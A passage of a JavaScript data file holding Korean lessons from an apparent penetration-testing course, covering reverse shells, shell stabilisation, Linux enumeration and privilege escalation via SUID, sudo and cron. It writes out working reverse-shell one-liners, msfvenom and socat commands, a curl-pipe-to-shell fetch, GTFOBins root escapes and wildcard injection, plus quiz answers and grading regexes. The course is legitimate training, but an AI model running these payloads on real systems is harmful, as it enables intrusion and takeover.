const ACTS=[

{n:3,t:"셸과 권한 상승",s:"발판을 잡았다. 이제 그 발판을 안정시키고, 낮은 권한에서 root·SYSTEM까지 올라간다.",days:[

{d:61,t:"리버스 셸 완전 이해",g:"표적에서 내 쪽으로 셸을 불러오는 원리와 여러 페이로드를 익힌다.",
c:"<p>웹 취약점·명령주입으로 <b>명령 실행(RCE)</b>을 얻었습니다. 이제 그걸 <b>대화형 셸</b>로 바꿉니다. 명령 하나씩 치는 것보다 훨씬 강력합니다.</p><p><b>바인드 셸 vs 리버스 셸</b><br><b>바인드 셸</b>: 표적이 포트를 열고 <b>기다림</b>. 내가 접속. 방화벽·NAT에 막히기 쉬움.<br><b>리버스 셸</b>: 표적이 <b>내게 연결해 옴</b>. 대부분의 방화벽이 아웃바운드는 허용하므로 <b>실전 표준</b>입니다.</p><p><b>흐름</b><br>① 내 Kali에서 리스너를 엽니다: <code>nc -lvnp 4444</code>.<br>② 표적에서 리버스 셸 페이로드를 실행합니다(RCE로).<br>③ 표적이 내 4444로 연결 → 셸 획득.</p><p><b>페이로드 — 환경마다 다르게</b><br><b>bash</b>: <code>bash -i &gt;&amp; /dev/tcp/내IP/4444 0&gt;&amp;1</code><br><b>nc</b>: <code>nc 내IP 4444 -e /bin/bash</code> (mkfifo 변형도)<br><b>python</b>: <code>python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"내IP\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'</code><br><b>PHP·Perl·Ruby·PowerShell</b> 버전도 있습니다. 표적에 뭐가 설치됐는지에 따라 고릅니다.</p><p><b>페이로드 생성 도구</b><br><b>msfvenom</b>: <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=내IP LPORT=4444 -f elf -o s</code><br><b>revshells.com</b>: 웹에서 IP·포트·타입을 넣으면 페이로드를 만들어 줍니다. 실전에서 매우 편합니다.</p><p><b>인코딩·우회</b><br>특수문자가 필터되면 Base64로 감싸 <code>echo BASE64|base64 -d|bash</code>. URL 인코딩이 필요할 때도 있습니다.</p><p><b>왜 리버스인가:</b> 대부분의 네트워크는 <b>들어오는 연결(인바운드)은 막고 나가는 연결(아웃바운드)은 허용</b>합니다. 그래서 표적이 밖으로 연결하게 만드는 리버스 셸이 방화벽을 자연스럽게 통과합니다. 방어 코스에서 배운 'C2 비컨이 아웃바운드로 나간다'가 바로 이겁니다 — 이제 그걸 만드는 쪽입니다.</p><p><b>실전:</b> 리스너를 먼저 열고(<code>nc -lvnp 4444</code>), RCE로 리버스 셸 페이로드를 실행합니다. 표적 환경(bash·python·nc 유무)에 맞는 페이로드를 고르는 게 요령입니다.</p>",
term:"# 1) 내 Kali에서 리스너\nkali@kali:~$ nc -lvnp 4444\nlistening on [any] 4444 ...\n\n# 2) 표적에서 (RCE로 실행)\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n\n# 3) 셸 획득\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.10.50] 54xxx\nwww-data@target:/var/www/html$",
lab:["Kali에서 <code>nc -lvnp 4444</code>로 리스너를 연다","bash 리버스 셸 페이로드로 셸을 잡아본다(실습 표적)","python3 리버스 셸 페이로드를 시험한다","revshells.com에서 페이로드를 생성해본다","<code>msfvenom</code>으로 리버스 셸 페이로드를 만든다","바인드 셸과 리버스 셸의 차이를 정리한다","특수문자 필터 시 Base64 우회를 시험한다"],
q:[{t:"실전에서 바인드 셸보다 리버스 셸을 주로 쓰는 이유는?",o:["더 빠르다","대부분의 방화벽이 인바운드는 막고 아웃바운드는 허용하므로, 표적이 밖으로 연결하는 리버스 셸이 방화벽을 통과하기 때문","암호화되어서","더 안전해서"],a:1,
  e:"방화벽은 보통 <b>들어오는 연결은 막고 나가는 연결은 허용</b>합니다. 리버스 셸은 표적이 공격자에게 <b>나가는 연결</b>을 맺으니 자연히 통과합니다. 방어 코스의 'C2가 아웃바운드로 나간다'가 이것입니다."},
   {t:"리버스 셸을 잡기 위한 올바른 순서는?",o:["표적에서 페이로드 실행 후 리스너 열기","먼저 내 쪽에서 리스너(nc -lvnp)를 열고, 그다음 표적에서 페이로드 실행","동시에","리스너 없이 바로"],a:1,
    e:"<b>리스너를 먼저</b> 열어야 합니다. 표적이 연결해 올 곳이 준비되어 있어야 하니까요. 순서가 바뀌면 표적의 연결이 갈 곳이 없어 실패합니다."},
   {k:"cmd",t:"내 Kali(<code>10.10.14.5</code>)에서 <b>4444 포트로 리버스 셸을 받을 리스너</b>를 여는 명령을 입력하세요.",
    ph:"nc ...","a":["nc -lvnp 4444"],"re":["^nc\\s+-lvnp\\s+4444$","^nc\\s+-nvlp\\s+4444$"],
    hint:"listen·verbose·no-dns·port 옵션을 붙입니다.",
    e:"<code>nc -lvnp 4444</code> — listen·verbose·numeric·port. 이걸 열어두고 표적에서 <code>bash -i >& /dev/tcp/10.10.14.5/4444 0>&1</code>을 실행하면 셸이 들어옵니다."}]},

{d:62,t:"셸 안정화 — 반쪽 셸을 완전하게",g:"기능이 제한된 리버스 셸을 완전한 대화형 TTY로 업그레이드한다.",
c:"<p>방금 잡은 리버스 셸은 <b>반쪽짜리</b>입니다. <code>Ctrl+C</code>를 누르면 셸이 죽고, 자동완성(Tab)·화살표·<code>sudo</code>·<code>vim</code>이 제대로 안 됩니다. 본격 작업 전에 <b>안정화(TTY 업그레이드)</b>가 첫 단계입니다.</p><p><b>왜 반쪽인가</b><br>보통 셸은 <b>TTY(터미널)</b>에 연결되어 있습니다. 리버스 셸은 그냥 소켓이라 TTY가 없어, TTY를 요구하는 기능들이 깨집니다.</p><p><b>안정화 3단계 (가장 표준)</b><br>① <code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'</code> — 부분 TTY 확보.<br>② <code>Ctrl+Z</code>로 셸을 백그라운드로 보낸 뒤, Kali에서 <code>stty raw -echo; fg</code> — 로컬 터미널 설정을 넘김.<br>③ 돌아온 셸에서 <code>export TERM=xterm</code> — 화면 크기·색.<br>이제 <code>Ctrl+C</code>, 자동완성, vim이 정상 동작합니다.</p><p><b>다른 방법</b><br>· <code>script /dev/null -c bash</code> (python 없을 때)<br>· <code>socat</code>으로 완전한 TTY: 표적 <code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:내IP:4444</code>, Kali <code>socat file:$(tty),raw,echo=0 tcp-listen:4444</code>.<br>· <b>rlwrap</b>으로 리스너를 감싸면 화살표·히스토리가 됩니다: <code>rlwrap nc -lvnp 4444</code>.</p><p><b>안정화 후 첫 확인</b><br><code>id</code>(내 권한), <code>hostname</code>, <code>uname -a</code>(커널), <code>ip a</code>(네트워크). 어디에, 누구로 있는지 파악합니다.</p><p><b>왜 중요한가:</b> 안정화 안 된 셸로 <code>su</code>·<code>sudo</code>·비밀번호 입력을 하면 실패하거나 셸이 죽습니다. 권한 상승·내부 탐색을 하려면 <b>제대로 된 셸이 전제</b>입니다. 초보는 이걸 건너뛰어 계속 셸을 잃습니다.</p><p><b>실전:</b> 셸을 잡자마자 python pty로 안정화하고, <code>stty</code>로 완전하게 만든 뒤, <code>id</code>로 시작합니다. 이게 몸에 배야 이후가 순조롭습니다.</p>",
term:"# 셸 안정화 3단계\nwww-data@target$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@target$ ^Z            # Ctrl+Z\nkali@kali:~$ stty raw -echo; fg\nwww-data@target$ export TERM=xterm\n# 이제 Ctrl+C, Tab, vim, sudo 가 정상 동작",
lab:["리버스 셸을 잡은 뒤 <code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'</code>로 부분 TTY를 얻는다","<code>Ctrl+Z</code> → <code>stty raw -echo; fg</code>로 완전 안정화한다","<code>export TERM=xterm</code>으로 터미널을 설정한다","안정화 전후로 <code>Ctrl+C</code>·Tab·vim 동작을 비교한다","python이 없으면 <code>script /dev/null -c bash</code>를 시험한다","<code>rlwrap nc -lvnp 4444</code>로 리스너를 감싸본다","안정화 후 <code>id·uname -a·ip a</code>로 환경을 파악한다"],
q:[{t:"리버스 셸이 처음에 '반쪽'인(Ctrl+C·자동완성·vim이 안 되는) 근본 이유는?",o:["느려서","완전한 TTY(터미널)에 연결되어 있지 않아, TTY를 요구하는 기능이 동작하지 않기 때문","암호화 때문","권한이 낮아서"],a:1,
  e:"리버스 셸은 <b>TTY 없는 소켓</b>입니다. <code>Ctrl+C</code>·job control·<code>vim</code>·비밀번호 입력은 TTY를 요구하므로, pty를 붙여 <b>안정화</b>해야 정상 동작합니다."},
   {t:"셸 안정화를 건너뛰면 생기는 실전 문제는?",o:["없음","su·sudo·비밀번호 입력이 실패하거나 Ctrl+C로 셸이 죽어, 권한 상승·탐색이 어려워짐","더 빨라짐","탐지됨"],a:1,
    e:"안정화 안 된 셸에서 <code>su</code>·<code>sudo</code>는 비밀번호 프롬프트를 못 다뤄 실패하고, 실수로 <code>Ctrl+C</code>를 누르면 셸 자체가 끊깁니다. 안정화는 이후 모든 작업의 전제입니다."},
   {k:"cmd",t:"방금 잡은 셸에서 <b>python3로 부분 TTY를 확보</b>하는 명령을 입력하세요.",
    ph:"python3 -c ...","a":["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],
    "re":["^python3?\\s+-c\\s+.*pty\\.spawn"],
    hint:"pty 모듈의 spawn으로 /bin/bash를 띄웁니다.",
    e:"<code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'</code> — 이후 Ctrl+Z → <code>stty raw -echo; fg</code> → <code>export TERM=xterm</code>으로 완전하게 만듭니다."}]},

{d:63,t:"발판 굳히기 — 무엇을, 누구로 잡았나",g:"셸을 얻은 직후 시스템을 체계적으로 열거해 권한 상승 단서를 모은다.",
c:"<p>안정된 셸을 얻었습니다. <b>바로 권한 상승 도구를 돌리기 전에</b>, 손으로 기본 정보를 훑습니다. 여기서 대부분의 단서가 나옵니다. 방어 코스에서 침해당한 시스템을 조사하던 그 명령들을, 이제 <b>공격자로서</b> 씁니다.</p><p><b>나는 누구인가</b><br><code>id</code>, <code>whoami</code>, <code>groups</code> — 내 사용자·그룹. <b>특별한 그룹(docker·lxd·sudo·adm)</b>에 속하면 그것만으로 상승 경로입니다.<br><code>sudo -l</code> — <b>비밀번호 없이 실행 가능한 sudo 명령.</b> 권한 상승의 1순위 확인.</p><p><b>시스템 정보</b><br><code>uname -a</code>, <code>cat /etc/os-release</code> — 커널·배포판 버전(커널 익스플로잇용).<br><code>hostname</code>, <code>ip a</code>, <code>ss -tulpn</code> — 네트워크·열린 포트(내부 서비스 = 내부 이동 단서).</p><p><b>사용자·자격증명</b><br><code>cat /etc/passwd</code> — 로그인 가능한 사용자(끝이 bash·sh).<br><code>ls -la /home/*</code>, <code>ls -la ~</code> — 홈 디렉터리, <code>.ssh</code>, <code>.bash_history</code>(비밀번호가 그냥 있는 경우!), 설정 파일.</p><p><b>실행 중인 것</b><br><code>ps aux</code> — root로 도는 프로세스(그걸 노림), 흥미로운 서비스.<br><code>crontab -l</code>, <code>cat /etc/crontab</code>, <code>ls -la /etc/cron*</code> — 예약 작업(악용 대상).</p><p><b>흥미로운 파일</b><br><code>find / -perm -4000 2&gt;/dev/null</code> — SUID 파일(내일).<br>설정·백업·<code>.git</code>·<code>config</code>·<code>.env</code> — 자격증명.<br><code>find / -writable -type d 2&gt;/dev/null</code> — 쓰기 가능한 곳.</p><p><b>왜 손으로 먼저인가:</b> 자동 도구(linpeas)는 강력하지만 <b>시끄럽고, 결과가 방대해</b> 핵심을 놓치기 쉽습니다. 손으로 훑으면 <b>시스템을 이해</b>하게 되고, 눈에 띄는 단서(sudo -l 결과, 홈의 비밀번호)를 바로 잡습니다. 도구는 그다음입니다.</p><p><b>실전:</b> 셸을 잡으면 <code>id → sudo -l → uname -a → 홈·설정 뒤지기 → SUID·cron</code> 순으로 훑습니다. 발견한 모든 것을 기록하고, 그다음 linpeas로 빠뜨린 걸 채웁니다.</p>",
term:"www-data@target$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@target$ sudo -l\nUser www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/find    # find를 root로! 상승 경로\nwww-data@target$ uname -a\nLinux target 4.4.0-31-generic ...     # 오래된 커널",
lab:["<code>id</code>·<code>groups</code>로 내 권한·그룹을 확인한다","<code>sudo -l</code>로 비밀번호 없이 되는 명령을 본다","<code>uname -a</code>·<code>cat /etc/os-release</code>로 커널·배포판을 본다","<code>cat /etc/passwd</code>로 로그인 가능한 사용자를 센다","홈 디렉터리·<code>.bash_history</code>·<code>.ssh</code>를 뒤진다","<code>ps aux</code>로 root로 도는 프로세스를 찾는다","<code>find / -perm -4000 2>/dev/null</code>로 SUID를 나열한다","발견을 전부 권한 상승 노트에 기록한다"],
q:[{t:"셸을 얻은 직후 권한 상승을 위해 가장 먼저 확인하는 것 중 하나는?",o:["서버 온도","<code>sudo -l</code> — 비밀번호 없이 실행 가능한 명령 확인","브라우저 기록","화면 밝기"],a:1,
  e:"<code>sudo -l</code>은 권한 상승의 <b>1순위 점검</b>입니다. <code>NOPASSWD</code>로 root 명령이 하나라도 있으면(특히 GTFOBins 목록의 것) 즉시 root가 됩니다."},
   {t:"자동 도구(linpeas)보다 손으로 먼저 열거하는 이점은?",o:["더 빠름","시스템을 이해하게 되고, 방대한 자동 결과에 묻힐 핵심 단서(sudo -l·홈의 비밀번호)를 직접 잡을 수 있음","더 조용함만","도구가 없어서"],a:1,
    e:"자동 도구는 <b>방대하고 시끄럽습니다.</b> 손으로 훑으면 시스템을 이해하고 눈에 띄는 단서를 바로 잡습니다. 그다음 linpeas로 빠뜨린 걸 채우는 게 좋은 순서입니다."},
   {t:"홈 디렉터리에서 권한 상승 단서로 특히 가치 있는 파일은?",o:["이미지","<code>.bash_history</code>(비밀번호가 평문으로)·<code>.ssh/id_rsa</code>(개인키)·설정 파일","음악","임시 파일"],a:1,
    e:"<code>.bash_history</code>에 비밀번호가 그대로 있거나, <code>.ssh/id_rsa</code>로 다른 계정·호스트에 로그인되는 경우가 흔합니다. 홈 디렉터리는 자격증명의 보고입니다."}]},

{d:64,t:"리눅스 권한 상승 — 자동 열거",g:"linpeas 등 자동 도구로 권한 상승 벡터를 빠짐없이 수집한다.",
c:"<p>손으로 훑었으니, 이제 <b>자동 도구</b>로 빠뜨린 것을 채웁니다. 이 도구들은 수백 개의 권한 상승 벡터를 자동 점검합니다.</p><p><b>LinPEAS — 사실상 표준</b><br>SUID·sudo·cron·커널·자격증명·오설정을 전부 점검하고 <b>색으로 위험도</b>를 표시합니다.<br>표적에 올려 실행: <code>curl 내IP/linpeas.sh | sh</code> 또는 파일로 전송 후 <code>./linpeas.sh</code>.<br><b>빨강/노랑 하이라이트</b>가 유력 벡터입니다 — 거기부터 봅니다.</p><p><b>파일 전송법(도구를 표적에 올리기)</b><br>Kali에서 <code>python3 -m http.server 80</code>으로 서빙 → 표적에서 <code>wget 내IP/linpeas.sh</code> 또는 <code>curl</code>. 실행 권한 없으면 <code>sh linpeas.sh</code>나 메모리에서 파이프 실행.</p><p><b>다른 도구</b><br>· <b>LinEnum</b>, <b>linux-smart-enumeration(lse.sh)</b> — 대안.<br>· <b>pspy</b> — <b>root 권한 없이</b> 실행 중인 프로세스·cron을 실시간 감시. 숨은 cron 작업을 잡는 데 최고.<br>· <b>GTFOBins</b>(웹) — 특정 바이너리(sudo·SUID로 얻은)로 권한 상승·파일 읽기·셸 탈출하는 법의 사전. sudo -l 결과를 여기서 찾습니다.</p><p><b>결과 읽는 법</b><br>도구가 다 찾아줘도 <b>사람이 판단</b>해야 합니다. 우선순위:<br>① <code>sudo -l</code>의 NOPASSWD → GTFOBins.<br>② 특이한 SUID 바이너리.<br>③ 쓰기 가능한 cron·서비스·PATH.<br>④ 취약한 커널(마지막 수단 — 불안정).<br>⑤ 홈·설정의 자격증명.</p><p><b>OPSEC 주의:</b> linpeas는 <b>매우 시끄럽습니다.</b> 수천 개 명령을 실행해 로그·EDR에 다 잡힙니다(방어 코스에서 이런 대량 열거를 탐지했었죠). CTF·실습엔 최고지만, 탐지 회피가 중요한 실전에선 <b>수동 열거를 선호</b>하거나 조용한 방식을 씁니다.</p><p><b>실전:</b> linpeas를 올려 실행하고, 빨강·노랑 하이라이트부터 검토합니다. sudo -l 결과는 GTFOBins에서, 커널 버전은 searchsploit에서 확인합니다. 자동+수동을 결합합니다.</p>",
term:"# Kali에서 서빙\nkali@kali:~$ python3 -m http.server 80\n# 표적에서 받아 실행\nwww-data@target$ curl 10.10.14.5/linpeas.sh | sh\n...\n[+] Checking sudo -l\n    (root) NOPASSWD: /usr/bin/find    <- 빨강 하이라이트\n[+] SUID files\n    /usr/bin/pkexec                   <- CVE 후보",
lab:["Kali에서 <code>python3 -m http.server 80</code>으로 도구를 서빙한다","표적에서 <code>curl 내IP/linpeas.sh | sh</code>로 실행한다","빨강·노랑 하이라이트를 우선 검토한다","<code>pspy</code>로 실행 중인 cron·프로세스를 실시간 감시한다","<code>sudo -l</code> 결과를 GTFOBins에서 찾아본다","커널 버전을 <code>searchsploit</code>으로 확인한다","자동 결과와 수동 발견을 종합해 우선순위를 매긴다"],
q:[{t:"GTFOBins가 권한 상승에 쓰이는 방식은?",o:["포트를 스캔","특정 바이너리(sudo·SUID로 실행 가능한)를 악용해 셸 획득·파일 읽기·권한 상승하는 방법을 모아둔 사전","비밀번호를 크랙","네트워크를 매핑"],a:1,
  e:"<code>sudo -l</code>이 <code>find</code>를 허용하면, GTFOBins에서 <code>find</code> 항목을 찾아 <code>sudo find . -exec /bin/sh \\; </code>로 root 셸을 얻습니다. '이 바이너리로 뭘 할 수 있나'의 사전입니다."},
   {t:"<code>pspy</code>가 특별히 유용한 이유는?",o:["가장 빠름","root 권한 없이도 실행 중인 프로세스·cron 작업을 실시간으로 볼 수 있어, 숨은 예약 작업을 포착","자동 익스플로잇","네트워크 스캔"],a:1,
    e:"<code>pspy</code>는 <b>비권한 사용자로</b> cron·프로세스를 실시간 감시합니다. <code>crontab -l</code>로 안 보이는 root cron 작업이 5분마다 도는 걸 잡아내, cron 악용 경로를 찾습니다."},
   {t:"linpeas 사용 시 OPSEC 관점의 주의점은?",o:["없음","수천 개 명령을 실행해 로그·EDR에 대량으로 잡히므로, 탐지 회피가 중요한 실전에선 수동 열거를 선호","너무 느림","불법"],a:1,
    e:"linpeas는 <b>매우 시끄럽습니다.</b> 방어 코스에서 탐지하던 그 대량 열거 패턴을 만듭니다. CTF엔 최고지만, 탐지팀이 있는 실전에선 조용한 수동 열거가 낫습니다."}]},

{d:65,t:"SUID/SGID 악용",g:"소유자 권한으로 실행되는 바이너리를 악용해 root 셸을 얻는다.",
c:"<p>방어 코스에서 <code>find / -perm -4000</code>으로 <b>SUID 파일</b>을 점검했습니다. 이제 <b>그걸 악용</b>합니다.</p><p><b>SUID 복습</b><br>SUID(4000) 비트가 있으면, 그 파일은 <b>실행자가 아니라 소유자의 권한</b>으로 실행됩니다. 소유자가 root면, 일반 사용자가 실행해도 <b>root 권한으로</b> 돕니다. <code>passwd</code>가 대표적(비밀번호를 바꾸려면 root 권한이 필요하니까).</p><p><b>찾기</b><br><code>find / -perm -4000 -type f 2&gt;/dev/null</code> — 모든 SUID root 바이너리.<br>표준 목록(<code>passwd</code>·<code>sudo</code>·<code>mount</code>·<code>su</code>·<code>ping</code>)을 빼고, <b>비표준·의외의 것</b>을 봅니다.</p><p><b>악용 — GTFOBins</b><br>많은 바이너리가 SUID로 실행되면 <b>root 셸이나 파일 읽기</b>를 내줍니다. GTFOBins에서 그 바이너리의 'SUID' 섹션을 봅니다.<br>· <code>find</code>: <code>find . -exec /bin/sh -p \\; -quit</code><br>· <code>vim</code>: <code>vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"reset; exec sh -p\")'</code><br>· <code>nmap</code>(구버전): <code>--interactive</code><br>· <code>bash</code>: <code>bash -p</code> (SUID bash면 그대로 root)<br>· <code>cp</code>·<code>less</code>·<code>awk</code>·<code>python</code>·<code>env</code>·<code>nano</code> 등 수십 개.</p><p><b>-p 옵션의 의미</b><br><code>/bin/sh -p</code>의 <code>-p</code>는 '권한을 떨어뜨리지 말라'입니다. SUID로 얻은 유효 UID(root)를 유지합니다. 이게 없으면 셸이 원래 권한으로 돌아갑니다.</p><p><b>커스텀 SUID 바이너리</b><br>회사가 만든 SUID 프로그램이 <b>시스템 명령을 부르면</b>(예: <code>system(\"service ...\")</code>) — PATH 하이재킹(Day 68)이나 인자 주입으로 악용합니다. <code>strings</code>·<code>ltrace</code>로 무엇을 부르는지 분석합니다.</p><p><b>왜 흔한가:</b> 관리자가 편의를 위해 SUID를 붙이거나(위험), 커스텀 도구에 잘못 설정합니다. 하나의 잘못된 SUID가 <b>즉시 root</b>로 이어집니다. 그래서 SUID 목록 점검이 권한 상승의 핵심입니다.</p><p><b>실전:</b> SUID 목록에서 표준이 아닌 것을 골라 GTFOBins에서 악용법을 찾습니다. 커스텀 바이너리는 <code>strings</code>로 분석해 호출하는 명령·PATH 의존성을 찾습니다.</p>",
term:"www-data@target$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find      <- 표준 아님. SUID find!\nwww-data@target$ /usr/bin/find . -exec /bin/sh -p \\; -quit\n# id -> uid=33 euid=0(root)   root 셸 획득",
lab:["<code>find / -perm -4000 -type f 2>/dev/null</code>로 SUID를 나열한다","표준 목록을 빼고 의외의 바이너리를 고른다","GTFOBins에서 그 바이너리의 SUID 악용법을 찾는다","<code>-p</code> 옵션의 역할을 이해하고 적용한다","커스텀 SUID 바이너리를 <code>strings</code>로 분석한다","악용에 성공해 root 셸의 <code>id</code>를 확인한다","SUID 악용 경로를 기록한다"],
q:[{t:"SUID 비트가 붙은 root 소유 바이너리가 위험한 이유는?",o:["느려서","일반 사용자가 실행해도 root 권한으로 동작하므로, 그 바이너리로 셸을 얻으면 root가 되기 때문","암호화 때문","용량 때문"],a:1,
  e:"SUID는 <b>소유자(root) 권한으로 실행</b>됩니다. 그 바이너리가 셸이나 명령 실행을 허용하면(GTFOBins 목록), 일반 사용자가 <b>root 셸</b>을 얻습니다."},
   {t:"<code>/bin/sh -p</code>에서 <code>-p</code>의 역할은?",o:["빠르게 실행","권한을 떨어뜨리지 않고 SUID로 얻은 유효 UID(root)를 유지",".p 파일 실행","포트 지정"],a:1,
    e:"<code>-p</code>가 없으면 셸이 <b>실제 UID로 권한을 낮춥니다.</b> <code>-p</code>는 SUID로 얻은 root 유효 UID를 유지시켜, root 셸이 유지되게 합니다."},
   {k:"cmd",t:"시스템의 <b>모든 SUID root 바이너리</b>를 찾는 명령을 입력하세요. (오류는 버림)",
    ph:"find ...","a":["find / -perm -4000 -type f 2>/dev/null"],
    "re":["^find\\s+/\\s+-perm\\s+-4000\\s+-type\\s+f\\s+2>/dev/null$","^find\\s+/\\s+-perm\\s+-4000\\s+2>/dev/null$"],
    hint:"권한 -4000, 파일만, 오류는 /dev/null로.",
    e:"<code>find / -perm -4000 -type f 2>/dev/null</code> — 방어 코스에서 점검하던 그 명령입니다. 이제 여기서 나온 비표준 바이너리를 GTFOBins에서 악용합니다."}]},

{d:66,t:"sudo 오설정 악용",g:"sudo -l로 허용된 명령을 GTFOBins로 악용해 root가 된다.",
c:"<p>권한 상승에서 <b>가장 자주 통하는</b> 경로입니다. <code>sudo -l</code>로 <b>비밀번호 없이 root로 실행 가능한 명령</b>을 확인하고, 그걸 악용합니다.</p><p><b>sudo -l 읽기</b><br><code>sudo -l</code>이 이렇게 나온다고 합시다:<br><code>(root) NOPASSWD: /usr/bin/vim</code><br>→ vim을 root로 실행할 수 있음. <b>vim에서 셸로 탈출</b>하면 root.<br><code>sudo vim -c ':!/bin/sh'</code> → root 셸.</p><p><b>GTFOBins가 답</b><br>거의 모든 명령이 root로 실행되면 악용됩니다:<br>· 에디터(<code>vim</code>·<code>nano</code>·<code>less</code>·<code>man</code>): <code>:!sh</code>·<code>!sh</code>로 셸 탈출.<br>· 인터프리터(<code>python</code>·<code>perl</code>·<code>ruby</code>·<code>awk</code>): <code>sudo python -c 'import os;os.system(\"/bin/sh\")'</code>.<br>· 파일 도구(<code>cp</code>·<code>tee</code>·<code>dd</code>): <code>/etc/passwd</code>·<code>/etc/shadow</code>를 읽거나 덮어씀.<br>· <code>find</code>·<code>nmap</code>·<code>tar</code>·<code>zip</code>·<code>git</code>: 각자의 탈출법.</p><p><b>환경 악용 — LD_PRELOAD</b><br><code>sudo -l</code>에 <code>env_keep+=LD_PRELOAD</code>가 있으면, 악성 공유 라이브러리를 만들어 <code>sudo LD_PRELOAD=/tmp/x.so 명령</code>으로 root 코드 실행.</p><p><b>와일드카드·인자 악용</b><br><code>(root) /usr/bin/tar -czf /backup/* </code>처럼 와일드카드가 있으면, 특수 파일명(<code>--checkpoint-action=exec=sh</code>)으로 명령 주입.</p><p><b>sudo 취약점(CVE)</b><br><b>Baron Samedit(CVE-2021-3156)</b> — sudo 자체의 힙 오버플로로, <code>sudoedit -s '\\'</code>로 root. 취약 버전이면 sudo 명령이 하나도 허용 안 돼도 됩니다.</p><p><b>왜 이렇게 흔한가:</b> 관리자가 '이 명령만 sudo 허용하면 편하겠지' 하고 주는데, <b>거의 모든 명령이 셸 탈출이나 파일 조작을 통해 root로 이어집니다.</b> '안전해 보이는' 명령도 GTFOBins에 거의 다 있습니다. 최소 권한 원칙이 지켜지기 어려운 지점입니다.</p><p><b>실전:</b> <code>sudo -l</code>을 실행해 허용 명령을 GTFOBins에서 하나씩 찾습니다. 대부분 즉시 root 셸이 나옵니다. env_keep·와일드카드·sudo 버전(CVE)도 함께 봅니다.</p>",
term:"www-data@target$ sudo -l\n    (root) NOPASSWD: /usr/bin/vim\nwww-data@target$ sudo vim -c ':!/bin/sh'\n# vim이 root로 실행 -> :! 로 셸 탈출\nroot@target# id\nuid=0(root) gid=0(root)",
lab:["<code>sudo -l</code>로 허용된 명령을 확인한다","허용 명령을 GTFOBins에서 찾아 악용법을 확인한다","에디터(vim·less)면 셸 탈출로 root를 얻는다","인터프리터(python)면 os.system으로 셸을 연다","<code>env_keep+=LD_PRELOAD</code>가 있으면 악용을 시험한다","sudo 버전을 확인해 CVE-2021-3156 취약 여부를 본다","root 획득 후 <code>id</code>로 확인한다"],
q:[{t:"<code>sudo -l</code>이 <code>(root) NOPASSWD: /usr/bin/less</code>를 보여줄 때 root가 되는 방법은?",o:["불가능","less를 root로 실행한 뒤 <code>!sh</code>로 셸을 탈출","비밀번호 크랙","포트 스캔"],a:1,
  e:"<code>sudo less /etc/profile</code> 후 <code>!sh</code>를 입력하면 root 셸이 열립니다. less·vim·man 같은 <b>페이저·에디터는 셸 탈출 기능</b>이 있어, root로 실행되면 root 셸이 됩니다."},
   {t:"'안전해 보이는' 명령도 sudo로 허용하면 위험한 이유는?",o:["느려서","거의 모든 명령이 셸 탈출·파일 조작·인터프리터 실행을 통해 root로 이어지며, 그 방법이 GTFOBins에 정리되어 있어서","암호 때문","용량 때문"],a:1,
    e:"<code>find·tar·awk·cp·git</code> 등 평범한 명령도 <b>GTFOBins</b>에 악용법이 있습니다. '이것만 허용하면 되겠지'가 함정입니다 — 최소 권한을 지키기 어려운 지점입니다."},
   {t:"CVE-2021-3156(Baron Samedit)이 특별히 위험한 이유는?",o:["느려서","sudo 바이너리 자체의 취약점이라, sudo 명령이 하나도 허용되지 않은 사용자도 root가 될 수 있어서","네트워크 공격이라","윈도우 전용"],a:1,
    e:"이건 <b>sudo 프로그램 자체의 힙 오버플로</b>입니다. <code>sudo -l</code>에 아무것도 없어도, 취약 버전이면 <code>sudoedit</code>로 root가 됩니다. sudo 버전 확인이 중요한 이유입니다."}]},

{d:67,t:"cron 작업 악용",g:"root로 주기적으로 실행되는 예약 작업의 허점을 파고든다.",
c:"<p>방어 코스에서 공격자가 <b>cron으로 지속성</b>을 확보하는 걸 봤습니다. 이제 반대로, <b>root의 cron 작업을 악용해 권한 상승</b>합니다.</p><p><b>cron 찾기</b><br><code>cat /etc/crontab</code> — 시스템 전역 cron. <b>어떤 사용자로 무엇이 도는지</b>가 보입니다.<br><code>ls -la /etc/cron.*</code> — 주기별 폴더.<br><code>crontab -l</code> — 내 것만(다른 사용자 건 안 보임).<br><b><code>pspy</code></b> — cron 파일에 안 보이는 작업도 <b>실행 순간 포착</b>. 최고의 도구입니다.</p><p><b>악용 ① — 쓰기 가능한 스크립트</b><br>root의 cron이 <code>/opt/backup.sh</code>를 실행하는데, <b>그 스크립트가 내게 쓰기 권한</b>이 있으면? 스크립트에 리버스 셸이나 <code>chmod +s /bin/bash</code>를 추가 → 다음 실행 때 root로 실행됨.<br><code>echo 'chmod +s /bin/bash' &gt;&gt; /opt/backup.sh</code> → 기다림 → <code>bash -p</code>로 root.</p><p><b>악용 ② — 쓰기 가능한 PATH·상대경로</b><br>cron 스크립트가 <code>backup</code>처럼 <b>절대경로 없이</b> 명령을 부르고, 그 명령을 내가 만들 수 있는 PATH에 놓을 수 있으면 하이재킹(Day 68).</p><p><b>악용 ③ — 와일드카드 주입</b><br>cron이 <code>tar -czf backup.tar.gz *</code>처럼 <b>와일드카드</b>를 쓰면, 폴더에 특수 파일명을 만들어 명령을 주입: <code>touch -- '--checkpoint=1'; touch -- '--checkpoint-action=exec=sh runme.sh'</code>. tar가 이 '파일'을 옵션으로 해석해 실행.</p><p><b>악용 ④ — 스크립트가 부르는 다른 파일이 쓰기 가능</b><br>스크립트 자체는 못 써도, 그게 <code>source /config</code>하는 파일이 쓰기 가능하면 거기에 주입.</p><p><b>왜 통하나:</b> cron은 <b>root로 실행</b>되는데, 그 작업이 참조하는 <b>스크립트·경로·파일 중 하나라도 낮은 권한이 통제</b>하면 